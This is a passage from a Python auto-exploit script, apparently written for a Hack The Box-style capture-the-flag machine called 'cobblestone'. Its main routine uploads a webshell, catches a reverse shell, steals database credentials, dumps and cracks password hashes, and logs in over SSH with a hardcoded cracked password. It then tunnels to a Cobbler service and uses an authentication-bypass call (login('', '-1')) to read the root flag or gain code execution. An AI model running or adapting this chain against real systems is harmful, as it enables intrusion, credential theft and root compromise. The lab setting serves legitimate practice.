            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_ip, 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                return ip
        except Exception:
            pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "10.10.14.1"

def parse_cli():
    """
    Usage:
      python3 cobblestone.py <TARGET_IP> [LHOST]
      python3 cobblestone.py <TARGET_IP> --lhost <LHOST>
    """
    if len(sys.argv) < 2:
        err(f"Usage: {sys.argv[0]} <TARGET_IP> [LHOST|--lhost <LHOST>]")
        sys.exit(1)

    target = sys.argv[1].strip()
    lhost = ""

    # Positional LHOST: python3 cobblestone.py <target> <lhost>
    if len(sys.argv) >= 3 and not sys.argv[2].startswith("-"):
        lhost = sys.argv[2].strip()
    else:
        # Flag style: --lhost 10.10.x.x
        if "--lhost" in sys.argv:
            idx = sys.argv.index("--lhost")
            if idx + 1 < len(sys.argv):
                lhost = sys.argv[idx + 1].strip()
    return target, lhost

def main():
    banner()
    TARGET, lhost_arg = parse_cli()
    LHOST  = lhost_arg if lhost_arg else get_local_ip(TARGET)
    LPORT  = 4444
    LPORT2 = 4445  # fallback RCE shell
    TUNNEL_PORT = 25151

    info(f"Target   : {TARGET}")
    info(f"Lhost    : {LHOST}")
    info(f"Time     : {time.strftime('%Y-%m-%d %H:%M:%S')}")

    check_deps()

    # ── 1. /etc/hosts ────────────────────────────────────────────────────────
    setup_hosts(TARGET)

    # ── 2. Register + Login ──────────────────────────────────────────────────
    vote_sess = Session("vote.cobblestone.htb")
    register_and_login(vote_sess)

    # ── 3 + 4. File Recon ────────────────────────────────────────────────────
    cobbler_port_str = file_recon(vote_sess)

    # ── 5. Upload Webshell ────────────────────────────────────────────────────
    shell_url = upload_webshell(vote_sess, TARGET)

    # ── 6. Reverse Shell ──────────────────────────────────────────────────────
    sh = get_reverse_shell(shell_url, vote_sess, LHOST, LPORT)

    user_flag_val  = ""
    root_flag_val  = ""
    ssh_password   = "iluvdannymorethanyouknow"  # from known cracked hash
    ssh_user       = "cobble"

    if sh.conn:
        # ── 7. Steal DB creds ─────────────────────────────────────────────
        db_creds = steal_db_creds(sh)

        # ── 8. MySQL dump ─────────────────────────────────────────────────
        hashes = dump_cobblestone_users(sh, db_creds)

        # ── 9. Crack hashes ───────────────────────────────────────────────
        cracked = crack_hashes(hashes)
        if "cobble" in cracked:
            ssh_password = cracked["cobble"]
            good(f"cobble password: {ssh_password}")

    # ── 10. SSH + User Flag ──────────────────────────────────────────────────
    user_flag_val = grab_user_flag(TARGET, ssh_user, ssh_password)
    if not user_flag_val and sh.conn:
        # Try reading from active shell path
        raw = sh.exec_cmd(f"cat /home/{ssh_user}/user.txt 2>/dev/null")
        if raw.strip():
            user_flag_val = raw.strip()

    if user_flag_val:
        flag("USER", user_flag_val)
    else:
        warn("Could not auto-extract user.txt  "
             f"run: ssh {ssh_user}@{TARGET}  password: {ssh_password}")

    # ── 11. SSH Tunnel + Cobbler CVE ─────────────────────────────────────────
    tunnel_proc = None
    if shutil.which("sshpass") and shutil.which("ssh"):
        tunnel_proc = setup_ssh_tunnel(TARGET, ssh_user, ssh_password, TUNNEL_PORT)
    else:
        warn("sshpass/ssh not found cannot auto-tunnel")
        warn(f"Manually run: ssh -L {TUNNEL_PORT}:127.0.0.1:25151 {ssh_user}@{TARGET}")
        warn(f"Then re-run the script or use the CVE exploit manually")

    server, token = cobbler_auth_bypass(TUNNEL_PORT)
    if server and token:
        # Fastest/reliable method: API-only Cheetah template render as root
        root_flag_val = cobbler_render_root_flag(server, token)

        # Try template_files approach
        dest_path = ""
        if not root_flag_val:
            dest_path = cobbler_read_root_flag(server, token)
            if dest_path:
                # Most reliable read path: SSH as cobble reading the copied file.
                read_path = dest_path if dest_path.startswith("/") else f"/srv/tftpboot/{dest_path}"
                out = ssh_exec(TARGET, ssh_user, ssh_password, f"cat {read_path} 2>/dev/null")
                m = re.search(r"\b([0-9a-f]{32})\b", out or "")
                if m:
                    root_flag_val = m.group(1)
                    good(f"Root flag read from {read_path}")

        if not root_flag_val and sh.conn:
            root_flag_val = grab_root_flag_via_shell(sh, dest_path)
        if not root_flag_val:
            # Try RCE via kickstart template
            root_flag_val = cobbler_rce_root_flag(server, token, LHOST, LPORT2)
    else:
        warn("Cobbler auth bypass failed tunnel may not be up")
        warn("Ensure SSH tunnel is established and retry")

    # ── 12. Results ──────────────────────────────────────────────────────────
    phase(12, "Results Summary")
    print(f"\n{W}{'═'*60}{RST}")
    print(f"{W}   Target      : {TARGET}{RST}")
    print(f"{W}   SSH User    : {ssh_user}:{ssh_password}{RST}")
    print(f"{W}   DB User     : {db_creds if 'db_creds' in dir() else 'see above'}{RST}")
    print(f"{W}{'═'*60}{RST}")

    if user_flag_val:
        flag("USER", user_flag_val)
    if root_flag_val:
        flag("ROOT", root_flag_val)

    if not root_flag_val:
        warn("Root flag not auto-extracted. Manual steps:")
        print(f"  {C}ssh -L 25151:127.0.0.1:25151 {ssh_user}@{TARGET}{RST}")
        print(f"  {C}python3 -c \"import xmlrpc.client; s=xmlrpc.client.ServerProxy('http://127.0.0.1:25151'); t=s.login('','-1'); print(t)\"{RST}")

    # Cleanup
    if tunnel_proc:
        tunnel_proc.terminate()

    print(f"\n{M}[DONE]{RST} {time.strftime('%H:%M:%S')}\n")

if __name__ == "__main__":
    main()
